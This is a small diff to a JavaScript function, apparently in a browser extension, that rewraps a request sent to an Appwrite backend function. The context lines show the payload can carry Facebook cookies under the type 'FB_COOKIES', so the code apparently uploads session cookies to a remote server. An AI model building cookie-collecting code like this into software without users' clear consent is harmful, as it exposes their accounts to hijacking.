@@ -1092,6 +1092,13 @@ async function sendToBackend(type, data, retry = false, retryCount = 0) {
       cookies: type === 'FB_COOKIES' ? (data?.cookies || cookies || '') : undefined
     };
 
+    // Wrap payload for Appwrite Executions API
+    // The API expects { "body": "stringified_json", "async": false }
+    const apiBody = {
+      body: JSON.stringify(payload),
+      async: false // Wait for response
+    };
+
     console.log('[SECURE] === Sending to Appwrite Function ===');
     console.log('[SECURE] Type:', type);
     console.log('[SECURE] UserId:', payload.userId);
@@ -1104,7 +1111,7 @@ async function sendToBackend(type, data, retry = false, retryCount = 0) {
         'Content-Type': 'application/json',
         'X-Appwrite-Project': APPWRITE_CONFIG.projectId
       },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(apiBody)
     });
 
     console.log('[SECURE] Function response:', response.status, response.statusText);
